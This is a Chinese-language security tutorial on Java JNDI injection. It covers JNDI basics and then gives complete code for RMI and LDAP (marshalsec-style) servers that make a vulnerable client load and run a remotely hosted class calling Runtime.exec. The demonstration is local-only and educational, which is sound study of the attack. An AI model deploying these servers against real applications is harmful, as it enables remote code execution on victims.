> 原文链接: https://www.anquanke.com//post/id/221917 


# Java安全之JNDI注入


                                阅读量   
                                **143090**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t014ac313fdc963af46.jpg)](https://p2.ssl.qhimg.com/t014ac313fdc963af46.jpg)



## 0x00 前言

续上篇文内容，接着来学习JNDI注入相关知识。JNDI注入是Fastjson反序列化漏洞中的攻击手法之一。



## 0x01 JNDI

### <a class="reference-link" name="%E6%A6%82%E8%BF%B0"></a>概述

JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。

JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。

JNDI可访问的现有的目录及服务有：<br>
DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。

以上是一段百度wiki的描述。简单点来说就相当于一个索引库，一个命名服务将对象和名称联系在了一起，并且可以通过它们指定的名称找到相应的对象。从网上文章里面查询到该作用是可以实现动态加载数据库配置文件，从而保持数据库代码不变动等。

### <a class="reference-link" name="JNDI%E7%BB%93%E6%9E%84"></a>JNDI结构

在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：

```
javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；

javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；

javax.naming.event：在命名目录服务器中请求事件通知；

javax.naming.ldap：提供LDAP支持；

javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。
```



## 0x02 前置知识

其实在面对一些比较新的知识的时候，个人会去记录一些新接触到的东西，例如类的作用。因为在看其他大佬写的文章上有些在一些前置需要的知识里面没有去叙述太多，需要自己去查找。对于刚刚接触到的人来说，还需要去翻阅资料。虽然说在网上都能查到，但是还是会有很多搜索的知识点，需要一个个去进行查找。所以在之类就将一些需要用到的知识点给记录到这里面。方便理解，也方便自己去进行翻看。

### <a class="reference-link" name="InitialContext%E7%B1%BB"></a>InitialContext类

#### <a class="reference-link" name="%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%EF%BC%9A"></a>构造方法：

```
InitialContext() 
构建一个初始上下文。  
InitialContext(boolean lazy) 
构造一个初始上下文，并选择不初始化它。  
InitialContext(Hashtable&lt;?,?&gt; environment) 
使用提供的环境构建初始上下文。
```

代码：

```
InitialContext initialContext = new InitialContext();
```

在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。

#### <a class="reference-link" name="%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"></a>常用方法：

```
bind(Name name, Object obj) 
    将名称绑定到对象。 
list(String name) 
    枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
lookup(String name) 
    检索命名对象。 
rebind(String name, Object obj) 
    将名称绑定到对象，覆盖任何现有绑定。 
unbind(String name) 
    取消绑定命名对象。
```

代码：

```
package com.rmi.demo;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class jndi `{`
    public static void main(String[] args) throws NamingException `{`
        String uri = "rmi://127.0.0.1:1099/work";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(uri);
    `}`
`}`
```

### <a class="reference-link" name="Reference%E7%B1%BB"></a>Reference类

该类也是在`javax.naming`的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。

#### <a class="reference-link" name="%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%EF%BC%9A"></a>构造方法：

```
Reference(String className) 
    为类名为“className”的对象构造一个新的引用。  
Reference(String className, RefAddr addr) 
    为类名为“className”的对象和地址构造一个新引用。  
Reference(String className, RefAddr addr, String factory, String factoryLocation) 
    为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  
Reference(String className, String factory, String factoryLocation) 
    为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。
```

代码：

```
String url = "http://127.0.0.1:8080";
        Reference reference = new Reference("test", "test", url);
```

参数1：`className` – 远程加载时所使用的类名

参数2：`classFactory` – 加载的`class`中需要实例化类的名称

参数3：`classFactoryLocation` – 提供`classes`数据的地址可以是`file/ftp/http`协议

#### <a class="reference-link" name="%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"></a>常用方法：

```
void add(int posn, RefAddr addr) 
    将地址添加到索引posn的地址列表中。  
void add(RefAddr addr) 
    将地址添加到地址列表的末尾。  
void clear() 
    从此引用中删除所有地址。  
RefAddr get(int posn) 
    检索索引posn上的地址。  
RefAddr get(String addrType) 
    检索地址类型为“addrType”的第一个地址。  
Enumeration&lt;RefAddr&gt; getAll() 
    检索本参考文献中地址的列举。  
String getClassName() 
    检索引用引用的对象的类名。  
String getFactoryClassLocation() 
    检索此引用引用的对象的工厂位置。  
String getFactoryClassName() 
    检索此引用引用对象的工厂的类名。    
Object remove(int posn) 
    从地址列表中删除索引posn上的地址。  
int size() 
    检索此引用中的地址数。  
String toString() 
    生成此引用的字符串表示形式。

```

代码：

```
package com.rmi.demo;

import com.sun.jndi.rmi.registry.ReferenceWrapper;


import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class jndi `{`
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException `{`
        String url = "http://127.0.0.1:8080"; 
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("test", "test", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("aa",referenceWrapper);


    `}`
`}`
```

这里可以看到调用完`Reference`后又调用了`ReferenceWrapper`将前面的`Reference`对象给传进去，这是为什么呢？

[![](https://p3.ssl.qhimg.com/t01e90c53c1cb42b2d0.png)](https://p3.ssl.qhimg.com/t01e90c53c1cb42b2d0.png)

其实查看`Reference`就可以知道原因，查看到`Reference`,并没有实现`Remote`接口也没有继承 `UnicastRemoteObject`类，前面讲RMI的时候说过，需要将类注册到`Registry`需要实现`Remote`和继承`UnicastRemoteObject`类。这里并没有看到相关的代码，所以这里还需要调用`ReferenceWrapper`将他给封装一下。



## 0x03 JNDI注入攻击

在叙述JNDI注入前先来看一段源码。

#### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%EF%BC%9A"></a>代码示例：

```
package com.rmi.demo;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class jndi `{`
    public static void main(String[] args) throws NamingException `{`
        String uri = "rmi://127.0.0.1:1099/work";
        InitialContext initialContext = new InitialContext();//得到初始目录环境的一个引用
        initialContext.lookup(uri);//获取指定的远程对象

    `}`
`}`
```

在上面的`InitialContext.lookup(uri)`的这里，如果说URI可控，那么客户端就可能会被攻击。具体的原因下面再去做分析。JNDI可以使用RMI、LDAP来访问目标服务。在实际运用中也会使用到JNDI注入配合RMI等方式实现攻击。

### <a class="reference-link" name="JNDI%E6%B3%A8%E5%85%A5+RMI%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB"></a>JNDI注入+RMI实现攻击

下面还是来看几段代码，来做一个分析具体的攻击流程。

#### <a class="reference-link" name="RMIServer%E4%BB%A3%E7%A0%81%EF%BC%9A"></a>RMIServer代码：

```
package com.rmi.jndi;


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class server `{`
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException `{`
        String url = "http://127.0.0.1:8080/";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("test", "test", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("obj",referenceWrapper);
        System.out.println("running");
    `}`
`}`
```

#### <a class="reference-link" name="RMIClient%E4%BB%A3%E7%A0%81%EF%BC%9A"></a>RMIClient代码：

```
package com.rmi.jndi;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class client `{`
    public static void main(String[] args) throws NamingException `{`
        String url = "rmi://localhost:1099/obj";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
    `}`
`}`
```

下面还需要一段执行命令的代码，挂载在web页面上让server端去请求。

```
package com.rmi.jndi;

import java.io.IOException;

public class test `{`
    public static void main(String[] args) throws IOException `{`
        Runtime.getRuntime().exec("calc");

    `}`
`}`
```

使用javac命令，将该类编译成class文件挂载在web页面上。

原理其实就是把恶意的`Reference`类，绑定在RMI的Registry 里面，在客户端调用`lookup`远程获取远程类的时候，就会获取到`Reference`对象，获取到`Reference`对象后，会去寻找`Reference`中指定的类，如果查找不到则会在`Reference`中指定的远程地址去进行请求，请求到远程的类后会在本地进行执行。

[![](https://p5.ssl.qhimg.com/t01b175b890da6c6bff.png)](https://p5.ssl.qhimg.com/t01b175b890da6c6bff.png)

我在这里其实是执行失败了，因为在高版本中，系统属性 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为false。而在低版本中这几个选项默认为true，可以远程加载一些类。

### <a class="reference-link" name="LDAP%E6%A6%82%E5%BF%B5"></a>LDAP概念

轻型目录访问协议（英文：Lightweight Directory Access Protocol，缩写：LDAP，/ˈɛldæp/）是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。

### <a class="reference-link" name="JNDI%E6%B3%A8%E5%85%A5+LDAP%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB"></a>JNDI注入+LDAP实现攻击

有了前面的案例后，再来看这个其实也比较简单，之所以JNDI注入会配合LDAP是因为LDAP服务的Reference远程加载Factory类不受`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的限制。

启动一个ldap服务，该代码由某大佬改自marshalsec。

```
package com.rmi.rmiclient;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class demo `{`

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) `{`
        String[] args=new String[]`{`"http://127.0.0.1:8080/#test"`}`;
        int port = 7777;

        try `{`
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        `}`
        catch ( Exception e ) `{`
            e.printStackTrace();
        `}`
    `}`

    private static class OperationInterceptor extends InMemoryOperationInterceptor `{`

        private URL codebase;

        public OperationInterceptor ( URL cb ) `{`
            this.codebase = cb;
        `}`

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) `{`
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try `{`
                sendResult(result, base, e);
            `}`
            catch ( Exception e1 ) `{`
                e1.printStackTrace();
            `}`
        `}`

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException `{`
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos &gt; 0 ) `{`
                cbstring = cbstring.substring(0, refPos);
            `}`
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        `}`
    `}`
`}`
```

编写一个client客户端。

```
package com.rmi.rmiclient;




import javax.naming.InitialContext;
import javax.naming.NamingException;



public class clientdemo `{`
    public static void main(String[] args) throws NamingException `{`
        Object object=new InitialContext().lookup("ldap://127.0.0.1:7777/calc");
`}``}`
```

编写一个远程恶意类，并将其编译成class文件，放置web页面中。

```
public class test`{`
    public test() throws Exception`{`
        Runtime.getRuntime().exec("calc");
    `}`
`}`
```

[![](https://p4.ssl.qhimg.com/t0126507fa138432ccf.png)](https://p4.ssl.qhimg.com/t0126507fa138432ccf.png)

这里有个坑点，就是恶意的类，不能包含最上面的package信息，否则会调用失败。下面来启动一下服务器端，然后启动客户端。

[![](https://p5.ssl.qhimg.com/t012cebaeeb40765f98.png)](https://p5.ssl.qhimg.com/t012cebaeeb40765f98.png)

在 JDK 8u191 `com.sun.jndi.ldap.object.trustURLCodebase`属性的默认值被调整为false。这样的方式没法进行利用，但是还是会有绕过方式。在这里不做赘述。

### <a class="reference-link" name="%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"></a>参考文章

```
https://xz.aliyun.com/t/8214
https://xz.aliyun.com/t/6633
https://xz.aliyun.com/t/7264
```

在此感谢师傅们的文章，粗略的列了几个师傅的文章，但不仅限于这些。文中有一些错误的地方，望师傅们指出。



## 0x04 结尾

其实在这篇文中前前后后也是花费了不少时间，各种坑。
